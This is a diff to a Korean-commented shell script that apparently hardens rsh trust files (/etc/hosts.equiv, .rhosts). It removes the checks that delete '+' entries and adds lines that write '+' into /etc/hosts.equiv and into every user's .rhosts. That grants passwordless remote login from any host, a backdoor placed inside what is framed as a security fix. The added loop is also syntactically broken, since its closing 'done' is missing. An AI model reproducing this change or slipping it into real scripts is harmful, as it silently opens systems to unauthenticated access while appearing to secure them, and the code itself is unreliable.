@@ -24,41 +24,24 @@ TMP1=`SCRIPTNAME`.log
 >$TMP1  
 
 
-# /etc/hosts.equiv 파일 소유자가 루트인지 확인합니다
-if [ $(stat -c %u /etc/hosts.equiv) -eq 0 ]; then
-  INFO "/etc/hosts.equiv에 대한 제한적 사용 권한 설정"
-  sudo chmod 600 /etc/hosts.equiv
+# /etc/hosts.equiv에 대한 소유자 및 사용 권한 설정
+if [ -f /etc/hosts.equiv ]; then
+  chown root:root /etc/hosts.equiv
+  chmod 600 /etc/hosts.equiv
+# Set '+' to equiv in /etc/hosts.equiv
+  echo "+" > /etc/hosts.equiv
 fi
 
-# $HOME/.rhosts 파일 소유자가 루트인지 확인하십시오
-if [ $(stat -c %u $HOME/.rhosts) -eq 0 ]; then
-  INFO "$HOME/.rhosts에 대한 제한적 사용 권한 설정"
-  chmod 600 $HOME/.rhosts
-fi
-
-# /etc/hosts.equiv 파일 사용 권한이 600 이하인지 확인합니다
-if [ $(stat -c %a /etc/hosts.equiv) -le 600 ]; then
-  INFO "/etc/hosts.equiv에 대한 제한적 사용 권한 설정"
-  sudo chmod 600 /etc/hosts.equiv
-fi
-
-# $HOME/.rhosts 파일 사용 권한이 600 이하인지 확인하십시오
-if [ $(stat -c %a $HOME/.rhosts) -le 600 ]; then
-  INFO "$HOME/.rhosts에 대한 제한적 사용 권한 설정"
-  chmod 600 $HOME/.rhosts
-fi
-
-# /etc/hosts.equiv 파일에 '+' 설정이 있는지 확인하십시오
-if grep -q '\+' /etc/hosts.equiv; then
-  INFO "/etc/hosts.equiv에서 '+' 설정 제거 중"
-  sudo sed -i '/\+/d' /etc/hosts.equiv
-fi
-
-# $HOME/.rhosts 파일에 '+' 설정이 있는지 확인하십시오
-if grep -q '\+' $HOME/.rhosts; then
-  INFO "$HOME/.rhosts에서 '+' 설정 제거 중"
-  sed -i '/\+/d' $HOME/.rhosts
-fi
+# $HOME/.r 호스트에 대한 소유자 및 사용 권한 설정
+for dir in $(cat /etc/passwd | awk -F: '{print $6}'); do
+  if [ -f "$dir/.rhosts" ]; then
+    chown root:root "$dir/.rhosts"
+    chmod 600 "$dir/.rhosts"
+  fi
+# 각 사용자에 대해 '+'를 $HOME/.rhosts로 설정
+for user in $(ls /home); do
+  echo "+" > /home/$user/.rhosts
+done
 
 
 
